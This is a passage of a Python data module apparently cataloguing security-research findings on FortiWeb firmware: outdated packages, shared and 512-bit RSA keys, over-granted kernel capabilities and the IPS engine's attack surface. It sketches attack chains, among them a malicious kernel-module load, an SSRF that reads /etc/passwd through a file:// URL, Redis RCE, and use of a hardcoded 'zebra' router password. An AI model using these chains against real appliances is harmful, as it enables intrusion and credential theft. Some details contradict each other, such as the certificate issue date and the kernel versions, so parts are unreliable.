        "python-libs.tar.xz (64MB) on the FortiWeb P1 partition contains the Python 3.10 standard library "
        "and 68 third-party site-packages used by the WVS (w3af) scanner and the Django-based management interface. "
        "Multiple packages are outdated with known CVEs. "
        "Key affected packages: "
        "(1) cryptography 37.0.2 (April 2022) -- 3 known CVEs; "
        "(2) ecdsa 0.17.0 (2022) -- Minerva timing attack; "
        "(3) Django 5.1.6 (2025) -- missing XSS fix from 5.1.7. "
        "Attack path: SSRF to w3af REST API (FWB-F09 chain) or authenticated access to Django management "
        "interface triggers affected codepaths."
    ),

    "package_inventory": {
        "python_version":     "Python 3.10 (kernel: Linux 6.1.62)",
        "total_site_packages": 68,
        "selected_versions": {
            "cryptography":   "37.0.2  (April 2022)",
            "ecdsa":          "0.17.0  (2022)",
            "Django":         "5.1.6   (January 2025)",
            "cffi":           "1.15.0  (2022)",
            "pyasn1":         "0.4.8   (2019)",
            "pycryptodome":   "3.20.0  (2024, no known CVEs)",
            "requests":       "2.32.5  (current)",
            "httpx":          "0.28.1  (current)",
            "boto3":          "1.42.55 (recent)",
            "botocore":       "1.42.55 (recent)",
            "awscli":         "1.25.2  (2022, old)",
            "redis":          "4.3.2   (2022)",
            "attrs":          "21.4.0  (2021)",
            "numpy":          "1.23.4  (2022)",
            "pysqlcipher3":   "1.0.4   (encrypted SQLite -- note: SQLCipher encryption not stdlib)",
            "sshpubkeys":     "bundled (SSH pubkey parsing for management)",
            "websockets":     "bundled (WebSocket support for WVS/management)",
            "matplotlib":     "3.5.2   (plotting, unexpected in WAF firmware)",
        },
    },

    "cve_findings": {
        "CVE-2023-49083": {
            "package":     "cryptography 37.0.2 (affected < 41.0.6)",
            "severity":    "MEDIUM (CVSS 4.0)",
            "description": "NULL pointer dereference in PKCS12 parsing -- parse_pkcs12() crashes when processing malformed PKCS12 data; Python interpreter NullPointerException",
            "trigger":     "FortiWeb certificate import via PKCS12 format (management interface)",
        },
        "CVE-2024-26130": {
            "package":     "cryptography 37.0.2 (affected < 42.0.4)",
            "severity":    "MEDIUM (CVSS 4.0)",
            "description": "NULL pointer dereference when serializing PKCS#12 with certain key types; process crash",
            "trigger":     "PKCS12 export/serialization path",
        },
        "CVE-2023-0286": {
            "package":     "cryptography 37.0.2 (OpenSSL-dependent)",
            "severity":    "HIGH (CVSS 7.4) -- OpenSSL X.400 type confusion",
            "description": "Type confusion between GeneralName X.400 addresses and ASN.1 strings; read-what-where condition in certificate parsing",
            "trigger":     "Certificate validation with X.400 SAN extensions",
        },
        "CVE-2024-23342": {
            "package":     "ecdsa 0.17.0 (all versions affected)",
            "severity":    "MEDIUM -- Minerva attack (timing side-channel)",
            "description": "ECDSA signing operations leak key bits via timing variation; private key recovery possible with ~38 million signatures observed via side channel",
            "trigger":     "FortiWeb uses ecdsa library for TLS/token signing -- timing observable by network attacker if ecdsa signs on critical path",
        },
        "CVE-2025-26115": {
            "package":     "Django 5.1.6 (fixed in 5.1.7, March 2025)",
            "severity":    "MEDIUM -- reflected XSS in admin change-password view",
            "description": "Django admin password change view reflects user-controlled input without escaping; reflected XSS against authenticated admin users",
            "trigger":     "Django admin interface access (management UI)",
        },
    },

    "attack_surface": {
        "django_exposure":   "Django 5.1.6 serves the FortiWeb management interface; admin interface exposed to authenticated management users; CVE-2025-26115 XSS exploitable with social engineering",
        "cryptography_path": "Certificate import/export in FortiWeb management (HTTPS cert management); PKCS12 import triggers cryptography PKCS12 parser",
        "ecdsa_path":        "httpsig (HTTP Signature library, version 1.3.0) in site-packages uses ecdsa for request signing -- if used on HMAC-sensitive channels, Minerva timing applies",
    },

    "notable_unexpected": {
        "matplotlib": "matplotlib 3.5.2 included -- unexpected in WAF firmware; suggests chart/graph generation in management interface or WVS scan reports",
        "boto3_awscli": "boto3 1.42.55 + awscli 1.25.2 -- AWS cloud integration; awscli 1.25.2 is from 2022, potentially missing credential handling fixes",
        "pysqlcipher3": "pysqlcipher3 1.0.4 -- encrypted SQLite (SQLCipher); suggests a secrets or credential store uses encrypted SQLite in the management stack",
        "sshpubkeys": "sshpubkeys library -- SSH public key parsing; FortiWeb management supports SSH key auth for admin accounts",
    },

    "remediation": "Update cryptography to >= 42.0.4, ecdsa to >= 0.18.0 (or replace with cryptography module's ECDSA), Django to >= 5.1.7. Pin all package versions in pyproject.toml and integrate pip-audit in build pipeline.",
}


# FFW-F05: fgt2.key static RSA private key -- same as FGT 7.4.12, FGT 8.0.0, FGA 8.0.0
# Source: datafs.tar.gz -> etc/fgt2.key (unencrypted partition)
# ---------------------------------------------------------
FFW_F05_SHARED_RSA_KEY = {
    "id":       "FFW-F05",
    "product":  "Fortinet FortiWeb FortiOS 8.0.0 VM64-KVM",
    "severity": "CRITICAL -- same static RSA private key (fgt2.key) present in FFW 8.0.0 as in "
                "FGT 7.4.12, FGT 8.0.0, FGA 8.0.0; cross-product, cross-version shared static key",
    "class":    "Cryptographic Key Reuse -- cross-product shared static RSA private key",

    "source_file": "datafs.tar.gz -> etc/fgt2.key",
    "modulus_prefix": "A75C115F690B67C32834D43FE1BD50DB301CE34F6A96EACDD6AE16353E72715AA8893B03",

    "confirmed_products_same_key": [
        "Fortinet FortiWeb FortiOS 8.0.0 VM64-KVM     -- this finding",
        "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM   -- FGT-F27",
        "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM    -- FGT-F05 ref",
        "Fortinet FortiGate FortiOS 8.0.0 ARM64 (FGA) -- FGA-F01 ref",
    ],

    "impact": (
        "A single static key shared across FortiGate and FortiWeb product lines, across "
        "the 7.4.x and 8.0.x release trains. Key use: TLS mutual authentication, firmware "
        "integrity verification, and inter-device trust relationships. A private key extracted "
        "from any one device (via FGT-F09 rootfs decryption, fortism ioctl kernel access, or "
        "any other extraction path) is valid for all confirmed products. "
        "Scope: all FortiGate and FortiWeb devices globally in the affected firmware ranges."
    ),

    "verification": "CONFIRMED -- openssl rsa -noout -modulus on fgt2.key extracted from "
                    "FFW 8.0.0 datafs.tar.gz; modulus matches all other Fortinet products.",
    "status": "CONFIRMED",
}


# FWB-F11: CAP_SYS_MODULE granted to WAD + 4 additional domains in fortism_config.json
# Source: datafs.tar.gz -> etc/fortism_config.json (unencrypted partition)
# ---------------------------------------------------------
FWB_F11_WAD_CAP_SYS_MODULE = {
    "id":       "FWB-F11",
    "product":  "Fortinet FortiWeb FortiOS 8.0.0 VM64-KVM (fortism LSM policy config)",
    "severity": "HIGH -- WAD SSL-inspection proxy granted CAP_SYS_MODULE; allows kernel module "
                "loading from the highest-value, internet-facing daemon; 4 additional daemons "
                "(REMOTELOG, CSFD_PRIV, SNIFFERD, WEB_AUTH) also granted CAP_SYS_MODULE",
    "class":    "Privilege Over-grant -- CAP_SYS_MODULE in internet-facing daemon domain",

    "source_file": "datafs.tar.gz -> etc/fortism_config.json",

    "affected_domains": {
        "WAD": {
            "binary":     "/bin/wad",
            "role":       "SSL/TLS inspection proxy; handles all intercepted HTTP/HTTPS traffic",
            "exposure":   "Internet-facing; processes untrusted client content",
            "anon_mem_exec": 1,
            "cap_sys_module": "GRANTED",
            "other_caps": [
                "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FW_SES_DUMP",
                "CAP_SETGID", "CAP_NET_BIND_SERVICE", "CAP_NET_ADMIN",
                "CAP_NET_RAW", "CAP_IPC_LOCK", "CAP_FW_SES_ADMIN",
            ],
            "risk":  "WAD compromise via SSL inspection attack surface (memory corruption in TLS parsing, "
                     "content inspection, URL rewriting) -> CAP_SYS_MODULE -> insmod arbitrary .ko -> ring 0",
        },
        "REMOTELOG": {
            "binary":     "/bin/syslogd, /bin/fgtlogd",
            "role":       "Remote syslog forwarder",
            "cap_sys_module": "GRANTED",
            "risk":  "Log forwarding daemon with kernel module capability; log injection -> code exec -> module load",
        },
        "CSFD_PRIV": {
            "binary":     "/bin/csfd",
            "role":       "Fortinet content security framework daemon (privileged variant)",
            "cap_sys_module": "GRANTED",
            "risk":  "PRIV variant already indicates privileged context; adding kernel module capability redundant and dangerous",
        },
        "SNIFFERD": {
            "binary":     "/bin/httpsnifferd",
            "role":       "HTTP packet capture / deep inspection sniffer",
            "cap_sys_module": "GRANTED",
            "note":  "Could be needed for loading packet capture kernel modules, but CAP_NET_ADMIN + eBPF cover this without module loading",
        },
        "WEB_AUTH": {
            "binary":     "/bin/http_authd",
            "role":       "Web captive portal / HTTP authentication daemon",
            "exposure":   "Internet-facing (captive portal redirect handling)",
            "cap_sys_module": "GRANTED",
            "risk":  "Auth daemon compromised via captive portal injection -> CAP_SYS_MODULE -> ring 0",
        },
    },

    "attack_chain": (
        "Memory corruption in WAD TLS parsing (e.g., malformed ClientHello, certificate chain, "
        "or HTTP request during SSL inspection) -> "
        "WAD domain has anon-mem-exec=1 (shellcode staging allowed) -> "
        "CAP_SYS_MODULE granted -> insmod /tmp/attacker.ko -> "
        "kernel code execution / persistent rootkit. "
        "All steps within the WAD fortism security domain; no domain escape needed."
    ),

    "comparison": (
        "In FGT 7.4.12 fortism_config.json, WAD has anon-mem-exec=1, heap-exec=1, stack-exec=1, "
        "regain-root=1 but no explicit capability grants (capabilities are inherited from the process). "
        "In FFW 8.0.0, WAD explicitly grants CAP_SYS_MODULE, CAP_DAC_OVERRIDE, CAP_DAC_READ_SEARCH "
        "as deliberate policy inclusions. FFW 8.0.0's WAD privilege grant is more explicit and "
        "measurably worse for kernel integrity than FGT 7.4.12's exec-flag approach."
    ),

    "verification": "CONFIRMED -- etc/fortism_config.json Permission_Policies WAD entry extracted "
                    "from FFW 8.0.0 datafs.tar.gz; CAP_SYS_MODULE listed in capabilities.include. "
                    "5 domains confirmed via grep (lines 1173, 2162, 2882, 3723, 4714).",
    "status": "CONFIRMED",
}


# FWB-F12: /bin/node binary identical between FFW 8.0.0 and FGT 8.0.0 (cross-product shared binary)
# Source: hash_bin.sha256 from both FFW 8.0.0 and FGT 8.0.0 (unencrypted partition)
# ---------------------------------------------------------
FWB_F12_NODE_BINARY_SHARED = {
    "id":       "FWB-F12",
    "product":  "Fortinet FortiWeb FortiOS 8.0.0 / FortiGate FortiOS 8.0.0",
    "severity": "INFO -- /bin/node (Node.js) binary is byte-for-byte identical across FFW 8.0.0 "
                "and FGT 8.0.0; vulnerability in this binary affects both product lines simultaneously",
    "class":    "Shared binary across products -- cross-product Node.js vulnerability scope",

    "evidence": {
        "binary":         "/bin/node",
        "sha256_ffw_800": "1de035e241f616ee3201bfb90d516425191c111e727155b72356e8535cab49f2",
        "sha256_fgt_800": "1de035e241f616ee3201bfb90d516425191c111e727155b72356e8535cab49f2",
        "match":          "IDENTICAL -- same compiled binary in both products",
        "source_ffw":     "FFW 8.0.0 hash_bin.sha256 (unencrypted partition)",
        "source_fgt":     "FGT 8.0.0 hash_bin.sha256 (FGT-F25 in fortinet_fortigate_re.py)",
    },

    "node_scripts_differ": (
        "FFW 8.0.0 ships 221 node-scripts/chunk-*.js webpack bundles vs FGT 8.0.0's 20+ bundles. "
        "Bundle hashes are product-specific (different UI logic), but the underlying Node.js "
        "runtime is shared. Any Node.js runtime vulnerability (heap overflow in V8, "
        "buffer handling, native addon attack) affects both FortiGate and FortiWeb."
    ),

    "verification": "CONFIRMED -- SHA-256 match extracted from hash_bin.sha256 files on both products.",
    "status": "CONFIRMED",
}


# ---------------------------------------------------------
# FWB-F13: 512-bit RSA private key in WEB_AUTH domain (FFW 8.0.0)
# Source: FFW 8.0.0 datafs/etc/fgt_512.key + fortism_config.json WEB_AUTH domain
# ---------------------------------------------------------
FWB_F13_512BIT_KEY_WEB_AUTH = {
    "id":       "FWB-F13",
    "product":  "Fortinet FortiWeb FortiOS 8.0.0",
    "severity": "CRITICAL -- 512-bit RSA private key loaded by WEB_AUTH domain (user-facing web auth TLS service); "
                "512-bit RSA is factorable in days using public tools (CADO-NFS, public factoring services); "
                "factored key enables MITM of web authentication sessions and credential theft",
    "class":    "Broken Cryptographic Key / 512-bit RSA in Active Production Service",

    "key_details": {
        "file":       "/etc/fgt_512.key",
        "key_size":   "512-bit RSA (2 primes) -- cryptographically broken",
        "modulus_ffw_800": "B5ED8433938A7D0044B98B73AA98E5F92747A8811361D1DC9D0DA381C22900045BC0D21FDF4594B74DE6B1FD879207CE7901730EA29F1DE7568A45CF398199CF",
        "cert_file":  "/etc/fgt_512.crt",
        "cert_issued": "2025-12-05 (Dec 5, 2025) -- freshly issued 512-bit RSA cert; Fortinet deliberately chose broken key size in 2025",
        "cert_expires": "2056-05-24 (30-year validity)",
        "cert_subject": "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=FortiGate, CN=FortiGate, emailAddress=support@fortinet.com",
        "cert_issuer":  "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=Certificate Authority, CN=fortinet-subca2003",
        "signature_alg": "sha1WithRSAEncryption (SHA-1 + RSA-512; both deprecated/broken)",
        "note": "CORRECTED: prior module entry stated cert_issued=2011-02-21 and cert_expires=2038-01-19; actual cert data shows Dec 2025 issue date, May 2056 expiry; Fortinet issued a NEW 512-bit RSA cert in 2025",
    },

    "domain_usage": {
        "domain_name": "WEB_AUTH",
        "service":     "Web authentication daemon (captive portal / HTTP auth); user-facing TLS service",
        "confirmation": "fortism_config.json WEB_AUTH domain allowlist: '/etc/fgt2.crt' and '/etc/fgt_512.crt' both listed",
        "also_has":    "CAP_SYS_MODULE in Permission_Policies (FWB-F11) -- WEB_AUTH domain has both broken crypto and kernel module loading capability",
    },

    "exploit_path": (
        "Attacker uses CADO-NFS or RSA 512 factoring service to factor the 512-bit modulus B5ED8433... "
        "(publicly factorable; several public services have factored 512-bit RSA in <2 days). "
        "Derived private key enables: (1) certificate forgery for the FortiWeb management identity, "
        "(2) passive decryption of captured TLS sessions terminated by WEB_AUTH, "
        "(3) active MITM of HTTP authentication sessions (credential theft). "
        "The cert was issued December 2025 by Fortinet's own CA (fortinet-subca2003); "
        "Fortinet deliberately chose a 512-bit RSA key for a newly issued production cert in 2025. "
        "30-year validity (expires 2056) means no planned rotation."
    ),

    "cross_product_scope": {
        "ffw_800":    "CONFIRMED active -- WEB_AUTH fortism policy loads fgt_512.crt",
        "fgt_7412":   "file present in datafs (/etc/fgt_512.key, modulus CFB821074C9ADFD7...) but NOT referenced in fortism_config.json; usage in FGT 7.4.12 is unconfirmed",
        "fgt_7412_modulus": "CFB821074C9ADFD7951F8EDAB0229D295BB714B118ECA5F687995AFD5DC0F2DDEDB07E1C0CA300F6846D3D9B958F5AD5AE67D0610D335447EF6B49157D41D2AD",
        "key_uniqueness": "FFW and FGT 7.4.12 have DIFFERENT 512-bit moduli -- not cross-product shared; each must be factored independently",
    },

    "status": "CONFIRMED -- key extracted from FFW 8.0.0 datafs; WEB_AUTH domain usage confirmed via fortism_config.json; key is factorable",
}


# ---------------------------------------------------------
# FWB-F14: libips.so.new IPS engine attack surface
# ---------------------------------------------------------
FWB_F14_LIBIPS_ATTACK_SURFACE = {
    "id": "FWB-F14",
    "severity": "HIGH",
    "title": "libips.so.new IPS engine: popen/system via dlopen, embedded Lua, TCP reassembly, LMDB mmap, C/Rust FFI boundary",
    "file": "lib/libips.so.new",
    "file_info": {
        "size_bytes": 18525336,
        "arch": "ELF 64-bit x86-64 LSB shared object",
        "stripped": True,
        "soname": "libips.so",
        "build_id": "3473282a6bf9b4a237ef469d4b0bb9de22b70367",
        "needed": ["libdl.so.2", "librt.so.1", "libpthread.so.0", "libstdc++.so.6", "libm.so.6", "libgcc_s.so.1", "libc.so.6", "ld-linux-x86-64.so.2"],
        "rpath_rust_subprojects": [
            "zerocopy-derive-0.8.31",
            "thiserror-impl-2.0.3",
            "serde_derive-1.0.215",
            "enum_dispatch-0.3.13",
            "uvart (custom Fortinet Rust async runtime)",
            "libuv",
        ],
    },
    "interface": {
        "external_exports": ["ips_so_query_interface@@EXPORTED", "ips_so_patch_urldb@@EXPORTED"],
        "internal_function_count": 529,
        "access_pattern": "callers invoke ips_so_query_interface to receive a vtable; all 529 functions accessed via function pointers",
        "hot_patch": "ips_so_patch_urldb enables runtime URL database replacement without process restart",
    },
    "attack_surfaces": {
        "popen_system_via_dlopen": {
            "evidence": "strings: 'popen', 'system' present; UND symbol table is empty (nm -D returns 0 UND)",
            "implication": "popen/system resolved at runtime via dlopen('libc.so.6')+dlsym; bypasses standard UND-based detection; if any user-controlled data (URI, HTTP header, PCRE pattern, RADIUS field) reaches these calls, RCE",
            "domain": "IPS (EXCLUDE default, anon-mem-exec=1 per fortism_config.json)",
        },
        "lua_interpreter": {
            "functions": ["ips_luacfg_init", "ips_luacfg_parse_app_grp_filters", "ips_lua_prepare_call"],
            "threat": "Lua sandbox embedded in IPS engine; custom IPS rule injection via Lua grants script execution in IPS domain; Lua sandboxing historically leaky (os.execute, io.popen via FFI if luajit)",
        },
        "tcp_reassembly": {
            "functions": ["ips_tcp_resume", "ips_tcp_reenter", "ips_tcp_move_asm_to_sent", "ips_tcp_set_pkt_seq", "ips_tcp_truncate_packet", "ips_tcp_bypass", "ips_tcp_switch_to_dry", "ips_tcp_can_switch_mode"],
            "threat": "TCP segment reassembly engine; attacker-controlled TCP sequence numbers, segmentation, and retransmits are classic IPS evasion and reassembly-buffer overflow vectors",
        },
        "pcre_parsing": {
            "function": "ips_parse_pcre",
            "threat": "custom IPS rule upload includes PCRE patterns; malformed PCRE triggers PCRE engine bugs or ReDoS; admin-controlled but relevant for privilege escalation from restricted admin role",
        },
        "lmdb_mmap_store": {
            "functions": ["ips_mdb_init", "ips_mdb_fini", "ips_mdb_db_rm", "mdb_txn_begin", "mdb_txn_commit", "mdb_get", "mdb_put", "mdb_cursor_open", "mdb_cursor_del"],
            "db_path_format": "/tmp/ipscfgshm.%s",
            "threat": "LMDB uses memory-mapped files; mmap region corruption via filesystem write (IPS domain has write to /tmp/ips/*) leads to arbitrary read/write at the mapped VA",
        },
        "shared_memory_ipc": {
            "shm_names": ["ips.shm.localurlf", "ips.shm.localdnsf", "ips.shm.webch", "ips.shm.webcontent", "ips.shm.emailfilter-bword", "ips.sip_dialogs.shm"],
            "ipc_socket": "ips_otvp_ipc.sock (otvp_ipc_connect/send/close)",
            "threat": "SHM surfaces cross domain boundaries; TOCTOU on SHM read/write enables cross-domain data corruption from a less-privileged domain that shares SHM access",
        },
        "ha_session_replication": {
            "functions": ["ips_ha_sess_cache_prune", "ips_ha_session_add_send", "ips_ha_exp_session_clr"],
            "threat": "HA session sync is network-facing IPC between cluster peers; peer authentication weakness allows session injection from a compromised peer node",
        },
        "radius_field_parsing": {
            "fields_parsed": ["User-Password", "CHAP-Password", "Tunnel-Password", "ARAP-Password", "Configuration-Token", "Tunnel-Private-Group-ID"],
            "threat": "IPS engine dissects RADIUS auth fields from wire traffic; malformed RADIUS packets targeting the dissector; password fields parsed in plaintext within IPS engine memory",
        },
        "ssl_processing": {
            "functions": ["ips_dsct_ssl_processor", "ips_dsct_ssl_on_pktl_error", "ips_ssl_run_urlfilter", "ips_ssl_cert_verify_cache_insert", "ips_collect_ssl_log_negot_info", "ips_get_cert_block_page"],
            "threat": "SSL/TLS packet processing inside IPS domain; malformed TLS records targeting reassembly/cert parsing",
        },
        "rust_ffi_boundary": {
            "evidence": "RPATH contains zerocopy-derive-0.8.31, serde_derive, uvart, libuv alongside C++ (libstdc++.so.6)",
            "threat": "C/Rust FFI boundary; Rust 'unsafe' blocks at FFI layer; zero-copy deserialization (zerocopy crate) with malformed network input may hit logic errors; memory layout assumptions at FFI boundary",
        },
    },
    "fortism_context": {
        "domain": "IPS",
        "domain_id": 17,
        "default_act": "EXCLUDE",
        "chroot_path": "/tmp/ips_root",
        "anon_mem_exec": 1,
        "note": "IPS domain is EXCLUDE (sandboxed) with anon-mem-exec=1; post-exploitation shellcode can execute directly after memory corruption without additional bypasses",
    },
    "status": "CANDIDATE -- strings analysis only; runtime confirmation requires instrumented IPS engine load",
}


# ---------------------------------------------------------
# Analysis status
# ---------------------------------------------------------
ANALYSIS_STATUS = {
    "vmlinuz":        "COMPLETE -- 46MB ELF vmlinux extracted; fortism at 0x75e905; all 6 ioctls (0x9002/3/4/5/7/9) mapped and analyzed (FWB-F01 through FWB-F04); object table at 0xffffffff82caf4c0 (32-slot, smaller than FGT's 64-slot); no additional fortism findings beyond FWB-F01..F04",
    "rootfs_gz":      "BLOCKED -- custom encryption 0x84fe53de. FWB-specific.",
    "krootfs_gz":     "BLOCKED -- custom encryption 0xb63606e9. Different from rootfs.gz.",
    "datafs_tar_gz":  "COMPLETE -- 18MB standard gzip; extracted from p1.raw ext4 (SYSLINUX boot partition); contents: bin/, config/, etc/, lib/, var/; key attack surfaces analyzed (Redis, wassd_ws.py, Shibboleth SAML, MCP schemas, Python cloud connectors)",
    "fortism_ioctls": "COMPLETE -- all 6 ioctls mapped (0x9002, 0x9003, 0x9004, 0x9005, 0x9007, 0x9009).",
    "cross_products":  "FGT-F19/F20/F21 confirmed; FGT-F16/F22 confirmed but partially mitigated.",

    "hardware_appliance_firmware": {
        "note": "Second FortiWeb firmware analyzed: FortiWeb hardware appliance (FFWKVM-8.0 hardware series, NOT the 8.0.6.M KVM image analyzed above)",
        "build_date": "2026-04-20",
        "kernel": "Linux 4.19.13 (root@3ff2a6779e73, gcc 12.4.0)",
        "kernel_build_id": "ff4f7d808875e34fd38b3bfebb61969f80fa2f25",
        "source": "/mnt/ffw-p1/ (ext2 boot partition, hardware appliance)",
        "rootfs_gz": "BLOCKED -- custom encryption magic 0xa3ba56c6 (same as 8.0.6.M KVM)",
        "datafs_tar_gz": "IDENTICAL to 8.0.6.M KVM -- same SHA256 for fgt2.key and fortism_config.json; same userspace",
        "kernel_delta_vs_kvm": {
            "kvm_kernel": "Linux 6.1.62 (LTS, supported until Dec 2026)",
            "hw_kernel": "Linux 4.19.13 (LTS, EOL December 2024 -- NO upstream patches for 2025/2026 CVEs)",
            "security_gap": "4.19.13 lacks CFI, newer BPF restrictions, io_uring mitigations; Spectre/MDS coverage less complete than 6.1.x",
        },
        "fortism_confirmed": {
            "hooks": ["fortism_file_ioctl", "fortism_file_mmap", "fortism_file_mprotect", "fortism_file_open",
                      "fortism_bprm_check_security", "fortism_path_chroot", "fortism_path_link", "fortism_path_mknod",
                      "fortism_path_permission", "fortism_path_symlink", "fortism_path2_permission",
                      "fortism_ptrace_acl_check", "fortism_socket_connect", "fortism_socket_listen",
                      "fortism_task_kill", "fortism_task_setuid", "fortism_unix_connect", "fortism_unix_path_permission",
                      "fortism_inet6_connect", "fortism_kernel_load_data", "fortism_check_mm_maps",
                      "fortism_audit_log", "fortism_audit_log_violation"],
            "ioctls_present": [0x9002, 0x9003, 0x9004, 0x9005, 0x9007, 0x9009],
            "0x9007_bounds_check": False,
            "0x9007_note": "No bounds check on user-controlled index (confirmed by disassembly at 0x55d82d); same integer overflow as FGT-F16/FFW-F04; hardware kernel lacks the 0x40 guard present in FWB KVM 8.0.6",
            "object_table_slots": 64,
        },
        "kaslr": True,
        "retpoline": True,
        "default_admin_config": "system.conf.def contains ENC XXUp2ozpdysrQ admin password hash (reversible FortiOS AES; default factory config)",
    },

    "datafs_contents": {
        "etc/redis/": "10 Redis instances (6379-6389, 6382); all no requirepass; all bind 127.0.0.1 (FWB-F06)",
        "etc/wassd_ws.py": "Fortinet cloud mgmt WebSocket client; TLS verification disabled (FWB-F05)",
        "etc/cmf_cmdline.py": "CLI command bridge: reads file from sys.argv[1] -> pipes to /bin/cli admin cmd_line; not directly exposed",
        "etc/saml/shibboleth/": "Shibboleth SP 2.x config files (attribute-map.xml with 2.0 namespace) (FWB-F07)",
        "etc/mcp_schema/": "MCP protocol schemas: 2024-11-05, 2025-03-26, 2025-06-18, 2025-11-25 -- FortiWeb has MCP server/client capability",
        "etc/mcp_security_db.json": "ANALYZED -- FortiWeb MCP WAF pattern DB v1.00010 (2025-09-15); 23 pattern groups; monitors tools/call+tools/list+prompts/get across 4 MCP protocol versions; GenericAPIKey pattern over-broad (FWB-F08)",
        "etc/globalcert/": "Fortinet_Factory2.cer, defaultcert.cer, snca2.cer referenced in wassd_ws.py",
        "etc/filebeat/": "Filebeat config; cert/key managed by wassd_ws.py cloud channel",
        "etc/mysql/": "MariaDB config: MyISAM engine, port 3306, socket /tmp/mysql.sock, no credentials in config",
        "etc/aws_cloud_connector.py": "AWS EC2 API client; takes key_id, access_key as params (from CLI/config, not hardcoded)",
        "etc/fortism_config.json": "ANALYZED (FWB-F11): 5 domains with CAP_SYS_MODULE (WAD, REMOTELOG, CSFD_PRIV, SNIFFERD, WEB_AUTH); 6 domains with anon-mem-exec=1 (PRECHROOT, CMDBSVR, MISC, WAD, IPS, WEB_SVC); no heap-exec/stack-exec/regain-root (stricter than FGT 7.4.12)",
        "etc/fgt2.key": "ANALYZED (FFW-F05): modulus A75C115F... matches FGT 7.4.12/8.0.0/FGA 8.0.0; cross-product shared static RSA key",
        "etc/fgt_512.key": "ANALYZED (FWB-F13): 512-bit RSA private key; modulus B5ED8433... unique to FFW 8.0.0; WEB_AUTH domain loads fgt_512.crt (fortism_config.json confirmed); cert issued 2011; key is factorable",
        "etc/fgt_512.crt": "ANALYZED (FWB-F13): paired with fgt_512.key; active in WEB_AUTH domain; CORRECTED: issued 2025-12-05, expires 2056-05-24 (30-year cert); SHA-1+RSA-512; CN=fortinet-subca2003",
        "hash_bin.sha256": "ANALYZED (FWB-F12): 400 entries; /bin/node SHA-256 matches FGT 8.0.0 exactly; 221 node-scripts webpack chunks (product-specific UI); rootfs.gz encrypted (magic 0xa3ba56c6)",
        "lib/": "libfpm.so, libsigfunc.so.1 (signature engine), libav.so.orig; libips.so.new ANALYZED (FWB-F14)",
        "lib/libips.so.new": "ELF 64-bit x86-64 stripped 18.5MB; SONAME=libips.so; 2 external exports only (ips_so_query_interface, ips_so_patch_urldb); 529 internal functions exposed via vtable; popen+system resolved via dlopen at runtime (not in UND dynamic table); RPATH includes Rust subprojects (zerocopy-derive-0.8.31, serde_derive-1.0.215, uvart custom async runtime, libuv); LMDB (mdb_*) memory-mapped config store; Lua scripting (ips_luacfg_init, ips_lua_prepare_call); TCP reassembly engine (ips_tcp_*); PCRE parsing (ips_parse_pcre); HA session replication IPC (ips_ha_*); IPS SHM surfaces (ips.shm.localurlf, ips.shm.localdnsf, ips.shm.webch, ips.shm.webcontent, ips.shm.emailfilter-bword); otvp_ipc.sock Unix socket; RADIUS field parsing (User-Password, CHAP-Password, Tunnel-Password); path construction: /tmp/ipscfgshm.%s (FWB-F14)",
        "lib_packge/": "wvs.tar.xz ANALYZED (FWB-F09); python-libs.tar.xz ANALYZED (64MB, Python 3.10 stdlib + 68 site-packages); cryptography 37.0.2 (CVE-2023-49083, CVE-2024-26130, CVE-2023-0286), ecdsa 0.17.0 (CVE-2024-23342), Django 5.1.6 (CVE-2025-26115); matplotlib + boto3 + pysqlcipher3 + sshpubkeys notable; FWB-F10",
    },

    "unique_findings": [
        "FWB uses SMALLER object table (32 slots vs FGT/FFW's 64 slots)",
        "FWB has DIFFERENT object table address (0x82caf4c0)",
        "FWB has js MITIGATION for 0x9007 integer overflow -- FGT/FFW lack this",
        "FWB uses Linux 6.1.62 (different from FGT's 6.12.32 and FFW's 4.19.13)",
        "Dual-image boot (P1 and P2 both 781MB)",
        "FWB-F05: wassd_ws.py ctx.verify_mode=ssl.CERT_NONE -- Fortinet cloud WebSocket MitM; injects cert updates, log forwarding targets, ABP config",
        "FWB-F06: 10 Redis instances (6379-6389) all unauthenticated; SSRF -> FLUSHALL, session token forge, CONFIG SET RCE path",
        "FWB-F07: Shibboleth SP 2.x (EOL 2022) SAML config; same class as FAD-F10",
        "FortiWeb ships MCP schemas (2024-11-05 through 2025-11-25); MCP implementation in encrypted rootfs -- not yet analyzed",
        "FWB-F08: INFO -- FortiWeb MCP WAF proxy ships mcp_security_db.json v1.00010 (2025-09-15); 23 pattern groups; monitors tools/call+tools/list+prompts/get; GenericAPIKey pattern [A-Za-z0-9]{20,50} over-broad (matches JWTs/UUIDs/session tokens); WAF pattern bypass via encoding/Unicode normalization",
        "FWB-F09: CONFIRMED -- wvs.tar.xz w3af REST API requires_auth (auth.py:43) returns immediately when PASSWORD not in app.config; "
                 "'-p' password CLI flag is required=False default=False; URL() accepts file:// protocol; "
                 "POST /scans/ target_urls=['file:///etc/passwd'] = local file read; chain: any SSRF to 127.0.0.1:5000",
        "FWB-F22: CRITICAL -- libav.so.orig CFBF/OLE2 compound file parser heap OOB (8.0.0-8.0.1); "
                 "ParseFreeChunk/ParseFileNode/ParseTransactionLog access heap at base+offset+len without bounds check; "
                 "patched in 8.0.2 (added 'Error inside ParseFreeChunk: filesz<offset+len' error strings); "
                 "pre-auth: WAF content inspection runs on ALL HTTP traffic before routing; "
                 "trigger: HTTP POST with crafted CFBF (.doc/.xls) body; impact: heap OOB in root-running process; "
                 "binary evidence: libav.so.orig +12,448 bytes in 8.0.2; WVS unchanged (FWB-F09 not patched in 8.0.2)",
        "FWB-F21: MEDIUM -- rtmd.conf (Quagga routing daemon) hardcoded credentials password=zebra, enable_password=zebra; "
                 "any loopback-reachable process authenticates to Quagga VTY (ports 2601/2602/2605); "
                 "enable mode = routing table write, BGP session manipulation; "
                 "chain: FWB-F09 SSRF -> localhost:2601 -> zebra password -> route hijack",
        "FWB-F10: LOW -- python-libs.tar.xz outdated packages: cryptography 37.0.2 (CVE-2023-49083/CVE-2024-26130 PKCS12 null deref, CVE-2023-0286 X.400 type confusion), ecdsa 0.17.0 (CVE-2024-23342 Minerva timing), Django 5.1.6 (CVE-2025-26115 admin XSS); pysqlcipher3 suggests encrypted secrets store; matplotlib unexpected in WAF firmware",
